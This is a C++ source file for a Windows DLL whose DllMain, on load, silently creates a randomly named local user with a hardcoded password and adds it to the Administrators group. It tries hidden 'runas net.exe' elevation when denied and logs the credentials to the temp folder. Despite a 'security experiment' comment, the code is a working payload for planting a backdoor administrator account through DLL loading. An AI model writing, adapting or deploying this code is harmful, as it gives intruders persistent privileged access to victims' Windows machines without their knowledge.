#include "pch.h"
#include <windows.h>
#include <Lm.h>
#include <stdlib.h>    // for srand, rand
#include <wchar.h>     // for wcscpy_s, wcscat_s, wcslen, etc.
#include <shellapi.h>  // for ShellExecuteW
#pragma comment(lib, "netapi32.lib")

// Generate a short random username, e.g. "Testabc"
void GenerateShortUsername(WCHAR* buffer, size_t size) {
    static const WCHAR charset[] = L"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
    const size_t charsetSize = (sizeof(charset) / sizeof(charset[0])) - 1;

    // Copy "Test" into the beginning
    wcscpy_s(buffer, size, L"Test");

    // Generate 3 random characters (positions 4 to 6)
    for (int i = 4; i < 7; i++) {
        buffer[i] = charset[rand() % charsetSize];
    }
    buffer[7] = L'\0';
}

BOOL CreateAdminAccountSilently() {
    // 1. Generate short random username
    WCHAR username[32] = { 0 };
    GenerateShortUsername(username, 32);

    // 2. Create the account using NetUserAdd
    USER_INFO_1 ui;
    ui.usri1_name = username;
    ui.usri1_password = (LPWSTR)L"it488"; // Temporary password
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = (LPWSTR)L"Security experiment test account";
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (nStatus != NERR_Success) {
        if (nStatus == ERROR_ACCESS_DENIED) {
            // If access is denied, try to elevate via net.exe
            WCHAR cmdLine[256];
            swprintf_s(cmdLine, 256, L"user %s it488 /add", username);
            HINSTANCE hInst = ShellExecuteW(NULL, L"runas", L"net.exe", cmdLine, NULL, SW_HIDE);
            if ((INT_PTR)hInst <= 32) {
                // Elevation or user creation via net.exe failed
                return FALSE;
            }
        }
        else {
            // Other error codes -> fail silently
            return FALSE;
        }
    }

    // 3. Add the account to the Administrators group
    //    First get the local computer name
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computerName, &compSize);

    // Build "MACHINE_NAME\\Username"
    WCHAR fullName[64];
    swprintf_s(fullName, 64, L"%s\\%s", computerName, username);

    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = fullName;

    nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (nStatus != NERR_Success) {
        if (nStatus == ERROR_ACCESS_DENIED) {
            // Try elevating with net.exe again
            WCHAR cmdLine[256];
            swprintf_s(cmdLine, 256, L"localgroup administrators %s\\%s /add", computerName, username);
            HINSTANCE hInst = ShellExecuteW(NULL, L"runas", L"net.exe", cmdLine, NULL, SW_HIDE);
            if ((INT_PTR)hInst <= 32) {
                // Failed to elevate and add user to Administrators
                return FALSE;
            }
        }
        else {
            // Other errors -> remove the user, then fail
            NetUserDel(NULL, username);
            return FALSE;
        }
    }

    // 4. Write account info to a log file
    WCHAR logPath[MAX_PATH];
    GetTempPathW(MAX_PATH, logPath);
    wcscat_s(logPath, MAX_PATH, L"experiment_account.log");

    HANDLE hFile = CreateFileW(
        logPath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        WCHAR logEntry[256];
        swprintf_s(logEntry, 256, L"Account created: %s, Password: it488\r\n", username);
        DWORD bytesWritten = 0;
        WriteFile(hFile, logEntry, (DWORD)wcslen(logEntry) * sizeof(WCHAR), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
    // If the file can't be opened, we ignore it and treat the creation as successful

    // Only show a popup on success
    MessageBoxW(NULL, L"Account successfully created.", L"Success", MB_OK | MB_ICONINFORMATION);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Initialize the random seed
        srand((unsigned)GetTickCount());

        // Execute the account creation silently
        CreateAdminAccountSilently();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
